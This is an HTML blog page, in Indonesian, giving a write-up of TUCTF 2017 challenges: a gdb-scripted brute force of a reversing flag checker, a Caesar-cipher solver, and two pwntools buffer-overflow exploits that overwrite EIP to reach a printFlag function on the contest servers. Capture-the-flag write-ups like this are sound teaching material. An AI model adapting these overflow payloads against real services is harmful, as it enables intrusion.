@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>TUCTF 2017 - Writeup</title>
+  <meta name="description" content="Reversing 200 (Unknown)">
+  
+  <meta name="author" content="rhama">
+  <meta name="copyright" content="&copy; rhama 2018">
+  
+
+  <!-- External libraries -->
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/monokai.min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/css/lightbox.css">
+
+  <!-- Favicon and other icons (made with http://www.favicon-generator.org/) -->
+  <link rel="shortcut icon" href="/assets/icons/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon">
+  <link rel="apple-touch-icon" sizes="57x57" href="/assets/icons/apple-icon-57x57.png">
+  <link rel="apple-touch-icon" sizes="60x60" href="/assets/icons/apple-icon-60x60.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="/assets/icons/apple-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/assets/icons/apple-icon-76x76.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="/assets/icons/apple-icon-114x114.png">
+  <link rel="apple-touch-icon" sizes="120x120" href="/assets/icons/apple-icon-120x120.png">
+  <link rel="apple-touch-icon" sizes="144x144" href="/assets/icons/apple-icon-144x144.png">
+  <link rel="apple-touch-icon" sizes="152x152" href="/assets/icons/apple-icon-152x152.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/icons/apple-icon-180x180.png">
+  <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icons/android-icon-192x192.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="96x96" href="/assets/icons/favicon-96x96.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/icons/favicon-16x16.png">
+  <link rel="manifest" href="/assets/icons/manifest.json">
+  <meta name="msapplication-TileColor" content="#ffffff">
+  <meta name="msapplication-TileImage" content="/assets/icons/ms-icon-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  
+  <!-- Facebook OGP cards -->
+<!--   <meta property="og:description" content="Reversing 200 (Unknown)" />
+  <meta property="og:url" content="https://rhama.my.id" />
+  <meta property="og:site_name" content="CTF.Ninja" />
+  <meta property="og:title" content="TUCTF 2017 - Writeup" />
+  <meta property="og:type" content="website" />
+  <meta property="og:image" content="https://rhama.my.id/assets/images/ctf.png" />
+  <meta property="og:image:type" content="image/png" />
+  <meta property="og:image:width" content="612" />
+  <meta property="og:image:height" content="605" /> -->
+<meta content="https://rhama.my.id/assets/images/ctf.png" property="og:image" />
+<meta content="CTF.Ninja" property="og:site_name" />
+<meta content="object" property="og:type" />
+<meta content="TUCTF 2017 - Writeup" property="og:title" />
+<meta content="https://rhama.my.id/ctf/2017/11/27/tuctf-2017.html" property="og:url" />
+<meta content="Reversing 200 (Unknown)" property="og:description" />
+
+  
+
+  
+
+  
+
+  <!-- Site styles -->
+  <link rel="stylesheet" href="/css/main.css">
+   <link rel="stylesheet" href="/css/terminal.css">
+  <link rel="canonical" href="https://rhama.my.id/ctf/2017/11/27/tuctf-2017.html">
+  <link rel="alternate" type="application/rss+xml" title="CTF.Ninja" href="https://rhama.my.id/feed.xml" />
+</head>
+
+
+  <body>
+
+    <header class="navigation" role="banner">
+  <div class="navigation-wrapper">
+    <a href="/" class="logo">
+      
+      <img src="/assets/logo.png" alt="CTF.Ninja">
+      
+    </a>
+    <a href="javascript:void(0)" class="navigation-menu-button" id="js-mobile-menu">
+      <i class="fa fa-bars"></i>
+    </a>
+    <nav role="navigation">
+      <ul id="js-navigation-menu" class="navigation-menu show">
+        
+          
+          <li class="nav-link"><a href="/about/">About</a>
+          
+        
+          
+          <li class="nav-link"><a href="/posts/">Archives</a>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+        <div class="post">
+
+<div class="post-header-container has-cover" style="background-image: url(/assets/images/ctf.png);">
+  <div class="scrim has-cover">
+    <header class="post-header">
+      <h1 class="title">TUCTF 2017 - Writeup</h1>
+      <p class="info">by <strong>Aiden Pearce</strong></p>
+    </header>
+  </div>
+</div>
+
+<div class="wrapper">
+
+
+
+<section class="post-meta">
+  <div class="post-date">November 27, 2017</div>
+  <div class="post-categories">
+  in 
+    
+    <a href="/category/CTF">Ctf</a>
+    
+  
+  </div>
+</section>
+
+<article class="post-content">
+  <h2 id="reversing-200-unknown">Reversing 200 (Unknown)</h2>
+
+<p>Diberikan file ELF 64 bit stripped.</p>
+
+<p>Berikut hasil disassembly fungsi main</p>
+
+<pre><code class="language-C">signed __int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  signed __int64 result; // rax@2
+  unsigned int i; // [sp+14h] [bp-Ch]@5
+  char *v5; // [sp+18h] [bp-8h]@5
+
+  if ( a1 == 2 )
+  {
+    if ( strlen(a2[1]) == 56 )
+    {
+      v5 = a2[1];
+      for ( i = 0; i &lt; 0x38; ++i )
+      {
+        if ( (unsigned int)sub_401E90((__int64)v5, i) )
+          dword_603084 = 1;
+      }
+      if ( dword_603084 )
+        puts("Nope.");
+      else
+        printf("Congraz the flag is: %s\n", v5, a2);
+      result = 0LL;
+    }
+    else
+    {
+      puts("Still nope.");
+      result = 4294967294LL;
+    }
+  }
+  else
+  {
+    puts("Try again.");
+    result = 0xFFFFFFFFLL;
+  }
+  return result;
+}
+</code></pre>
+
+<p>Dari Pseudo-C diatas diketahui program membutuhkan <code class="highlighter-rouge">args</code> dan panjang nya <code class="highlighter-rouge">56 bytes</code>.</p>
+
+<p>fungsi <code class="highlighter-rouge">sub_401E90</code> akan memproses inputan, dan inputan di proses byte per byte hingga 56, dan <code class="highlighter-rouge">dword_603084</code> adalah global variable yang di set ke nilai <code class="highlighter-rouge">True</code>.</p>
+<pre><code class="language-C">for ( i = 0; i &lt; 0x38; ++i )
+      {
+        if ( (unsigned int)sub_401E90((__int64)v5, i) )
+          dword_603084 = 1;
+      }
+</code></pre>
+
+<p>saat mencoba membaca hasil Pseodo-C fungsi <code class="highlighter-rouge">sub_401E90</code>, saya sama sekali tidak mengerti proses apaan itu *ribet :v karena banyak fungsi-fungsi lain yang dipanggil lagi.</p>
+
+<p>Percobaan debug menggunakan <code class="highlighter-rouge">gdb</code>, yang dimana nilai hasil proses fungsi <code class="highlighter-rouge">sub_401E90</code>, <code class="highlighter-rouge">eax</code> akan bernilai <code class="highlighter-rouge">0x0</code> apabila byte inputan benar, dan  akan bernilai <code class="highlighter-rouge">0x1</code> apabila byte inputan salah.</p>
+
+<p>Snippet decompile</p>
+
+<pre><code class="language-asm">   0x401c7d:	call   0x401e90
+   0x401c82:	test   eax,eax
+   0x401c84:	je     0x401c90
+</code></pre>
+
+<pre><code class="language-asm">gdb-peda$ b *0x0000000000401c82
+Breakpoint 1 at 0x401c82
+gdb-peda$ r TUCTF{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+gdb-peda$ p/x $rax
+$3 = 0x0
+gdb-peda$ r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+gdb-peda$ p/x $rax
+$3 = 0x1
+</code></pre>
+<p>Karena inputan di proses, byte-per-byte, saya mencoba input dengan prefix “TUCTF{“ sehingga nilai <code class="highlighter-rouge">eax</code> akan bernilai <code class="highlighter-rouge">0x0</code> dalam 6 kali iterasi, dan selanjutkan <code class="highlighter-rouge">eax</code> akan bernilai <code class="highlighter-rouge">0x1</code> karena <code class="highlighter-rouge">"A"*50</code> bukan byte-byte yang benar. Dari sini kita bisa melakukan <em>Brute Force</em> setiap kemungkinan byte yang benar.</p>
+
+<p>Berikut script yang saya gunakan untuk melakukan brute force</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">gdb</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="n">char_set</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s">"!_}"</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="s">"TUCTF{"</span>
+
+<span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"b *0x0000000000401c82"</span><span class="p">)</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+	<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">char_set</span><span class="p">:</span>
+		<span class="n">pattern</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">55</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
+		<span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"r {}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">pattern</span><span class="p">))</span>
+		<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)):</span>
+			<span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"c"</span><span class="p">)</span>
+		<span class="n">rax</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"p/x $rax"</span><span class="p">,</span><span class="bp">True</span><span class="p">,</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+		<span class="k">if</span> <span class="n">rax</span> <span class="o">==</span> <span class="s">"0x0"</span><span class="p">:</span>
+		 	<span class="n">flag</span> <span class="o">+=</span> <span class="n">c</span>
+		 	<span class="k">if</span> <span class="s">"}"</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
+		 		<span class="k">print</span><span class="p">(</span><span class="s">"Flag : </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">flag</span><span class="p">))</span>
+		 		<span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+		 	<span class="k">print</span><span class="p">(</span><span class="s">"Curret Flag : </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">flag</span><span class="p">))</span>
+		 	<span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+		 	<span class="k">break</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">"Pattern : </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">pattern</span><span class="p">))</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">"Nilai Rax : </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">rax</span><span class="p">))</span>	
+</code></pre>
+</div>
+
+<div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>gdb -x unk.py -q unknown --nh --batch
+</code></pre>
+</div>
+<p>Setelah menunggu beberapa lama, akan mendapatkan Flag</p>
+
+<h3 id="flag--tuctfw3lc0m3707uc7f4nd7h4nky0uf0rp4r71c1p471n6">Flag : TUCTF{w3lc0m3_70_7uc7f_4nd_7h4nk_y0u_f0r_p4r71c1p471n6!}</h3>
+
+<h2 id="pwn-50-vuln-chat">Pwn 50 (Vuln-chat)</h2>
+
+<p><em>Classic Buffer Overflow</em> yang dimana meng overwrite <em>Local Variable</em> dengan “%s” agar pada bagian form “Enter your username” tidak dibatasi dan bisa meoverwrite <code class="highlighter-rouge">EIP</code> dan arahkan ke fungsi <code class="highlighter-rouge">printFlag</code>.</p>
+
+<p>Berikut script yang saya gunakan.</p>
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">vuln</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"vulnchat.tuctf.com"</span><span class="p">,</span><span class="mi">4141</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">20</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x00007325</span><span class="p">)</span> <span class="c"># overwrite with "%s"</span>
+<span class="n">vuln</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter your username: "</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">49</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804856b</span><span class="p">)</span>
+<span class="n">vuln</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span><span class="n">payload2</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">vuln</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+</code></pre>
+</div>
+
+<h2 id="pwn-100-vuln-chat20">Pwn 100 (Vuln-chat2.0)</h2>
+
+<p><em>Classic Buffer Overflow</em> yang dimana mengoverwrite nilai <code class="highlighter-rouge">EIP</code>, tetapi kita hanya membutuhkan 1 byte address dari fungsi <code class="highlighter-rouge">printFlag</code></p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x72</span><span class="s">"</span>
+<span class="n">vuln2</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"vulnchat2.tuctf.com"</span><span class="p">,</span> <span class="mi">4242</span><span class="p">)</span>
+<span class="n">vuln2</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter your username: "</span><span class="p">,</span><span class="s">"AAAA"</span><span class="p">)</span>
+<span class="n">vuln2</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"AAAA: "</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">43</span> <span class="o">+</span> <span class="n">flag</span>
+<span class="n">vuln2</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">vuln2</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</code></pre>
+</div>
+
+<h2 id="crypto-50-the-never-ending-crypto">Crypto 50 (The Never Ending Crypto)</h2>
+
+<p>Crypto 50 sebenar nya hanya <code class="highlighter-rouge">Caesar Cipher</code></p>
+
+<p>Berikut script yang saya gunakan untuk melakukan decrypt</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">string</span>
+
+<span class="n">never</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"neverending.tuctf.com"</span><span class="p">,</span><span class="mi">12345</span><span class="p">)</span>
+<span class="n">char_set</span> <span class="o">=</span> <span class="s">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !</span><span class="se">\"</span><span class="s">#$</span><span class="si">%</span><span class="s">&amp;</span><span class="se">\'</span><span class="s">()*+,-./:;&lt;=&gt;?@[</span><span class="se">\\</span><span class="s">]^_`{|}~</span><span class="err">\</span><span class="s">s"</span>
+
+<span class="k">def</span> <span class="nf">round1</span><span class="p">(</span><span class="n">char</span><span class="o">=</span><span class="s">"A"</span><span class="p">):</span>
+	<span class="n">never</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"text:"</span><span class="p">,</span><span class="n">char</span><span class="p">)</span>
+	<span class="n">enc_base</span> <span class="o">=</span> <span class="n">never</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"is "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+	<span class="n">enc_msg</span> <span class="o">=</span> <span class="n">never</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"is "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+	<span class="n">enc_msg</span> <span class="o">=</span> <span class="n">enc_msg</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">" decrypted?</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ENC BASE : -&gt; {}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">enc_base</span><span class="p">))</span>
+	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ENC MSG : -&gt; {}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">enc_msg</span><span class="p">))</span>
+	<span class="n">cal</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="n">enc_base</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+	<span class="n">dec</span> <span class="o">=</span> <span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">+</span> <span class="n">cal</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">enc_msg</span><span class="p">])</span>
+	
+	<span class="n">non_printable</span> <span class="o">=</span> <span class="p">[</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">z</span><span class="p">))</span> <span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="n">dec</span> <span class="k">if</span> <span class="n">z</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">char_set</span><span class="p">]</span>
+	<span class="n">printable</span> <span class="o">=</span> <span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">([</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">z</span><span class="p">)</span><span class="o">+</span><span class="mi">95</span><span class="p">)</span> <span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="n">non_printable</span> <span class="k">if</span> <span class="n">z</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">char_set</span><span class="p">])</span>
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">printable</span><span class="p">)):</span>
+	    <span class="n">dec</span> <span class="o">=</span> <span class="n">dec</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">non_printable</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="n">printable</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+
+	<span class="n">non_printable2</span> <span class="o">=</span> <span class="p">[</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">z</span><span class="p">))</span> <span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="n">dec</span> <span class="k">if</span> <span class="n">z</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">char_set</span><span class="p">]</span>
+	<span class="n">printable2</span> <span class="o">=</span> <span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">([</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">z</span><span class="p">)</span><span class="o">-</span><span class="mi">190</span><span class="p">)</span> <span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="n">non_printable2</span> <span class="k">if</span> <span class="n">z</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">char_set</span><span class="p">])</span>
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">printable2</span><span class="p">)):</span>
+	    <span class="n">dec</span> <span class="o">=</span> <span class="n">dec</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">non_printable2</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="n">printable2</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+
+	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Decrypted -&gt; {}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">repr</span><span class="p">(</span><span class="n">dec</span><span class="p">)))</span>
+	<span class="n">never</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">":"</span><span class="p">,</span><span class="n">dec</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+	<span class="k">try</span><span class="p">:</span>
+		<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Round {0}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+		<span class="n">round1</span><span class="p">()</span>
+		<span class="k">if</span> <span class="n">never</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s">"Correct!"</span><span class="p">:</span>
+			<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"-&gt; BENAR"</span><span class="p">)</span>
+			<span class="k">continue</span>
+		<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"-&gt; SALAH"</span><span class="p">)</span>
+	<span class="k">except</span><span class="p">:</span>
+		<span class="k">print</span> <span class="n">never</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+		<span class="n">never</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+		<span class="k">break</span>
+</code></pre>
+</div>
+
+<p>Pada Round 50 akan mendatkan Flag.</p>
+
+<h3 id="flag--tuctfwh0wsher3la5tyer">Flag : TUCTF{wh0_w@s_her3_la5t_ye@r?!?}</h3>
+
+</article>
+
+
+
+<section class="tags">
+  <strong>Tags:</strong> <a href="/tag/tuctf2017">tuctf2017</a>,&nbsp;<a href="/tag/CTF">CTF</a>
+</section>
+
+
+
+<section class="rss">
+  <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
+</section>
+
+<section class="share">
+  <span>Share: </span>
+  
+    
+    
+    
+      <a href="//www.facebook.com/sharer.php?t=TUCTF+2017+-+Writeup&u=https%3A%2F%2Frhama.my.id%2Fctf%2F2017%2F11%2F27%2Ftuctf-2017.html"
+        onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
+        <i class="fa fa-facebook-square fa-lg"></i>
+      </a>
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+      <a href="//www.reddit.com/submit" onclick="window.location = '//www.reddit.com/submit?url=' + encodeURIComponent('https://rhama.my.id/ctf/2017/11/27/tuctf-2017.html') + '&title=TUCTF 2017 - Writeup'; return false">
+        <i class="fa fa-reddit-square fa-lg"></i>
+      </a>
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+</section>
+
+
+
+
+</div>
+</div>
+
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h3 class="footer-heading">CTF.Ninja</h3>
+
+    <div class="site-navigation">
+
+      <p><strong>Site Map</strong></p>
+      <ul class="pages">
+        
+        
+          <li class="nav-link"><a href="/about/">About</a>
+        
+        
+        
+          <li class="nav-link"><a href="/posts/">Archives</a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+      </ul>
+    </div>
+
+    <div class="site-contact">
+
+      <p><strong>Contact</strong></p>
+      <ul class="social-media-list">
+        <li>
+          <a href="mailto:r4m@protonmail.com">
+            <i class="fa fa-envelope-o"></i>
+            <span class="username">r4m@protonmail.com</span>
+          </a>
+        </li>
+
+        
+          
+          <li>
+            <a href="https://www.facebook.com/eat.sleep.pwn.repeat" title="Friend me on Facebook">
+              <i class="fa fa-facebook"></i>
+              <span class="username">eat.sleep.pwn.repeat</span>
+            </a>
+          </li>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+
+      </ul>
+    </div>
+
+    <div class="site-signature">
+      <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
+      <p class="text">CTF, InfoSec, Banana And More.
+</p>
+    </div>
+
+  </div>
+
+</footer>
+
+<!-- Scripts -->
+<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/highlight.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/js/lightbox.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function() {
+  // Default syntax highlighting
+  hljs.initHighlightingOnLoad();
+
+  // Header
+  var menuToggle = $('#js-mobile-menu').unbind();
+  $('#js-navigation-menu').removeClass("show");
+  menuToggle.on('click', function(e) {
+    e.preventDefault();
+    $('#js-navigation-menu').slideToggle(function(){
+      if($('#js-navigation-menu').is(':hidden')) {
+        $('#js-navigation-menu').removeAttr('style');
+      }
+    });
+  });
+});
+
+</script>
+
+
+
+
+
+
+  </body>
+
+</html>
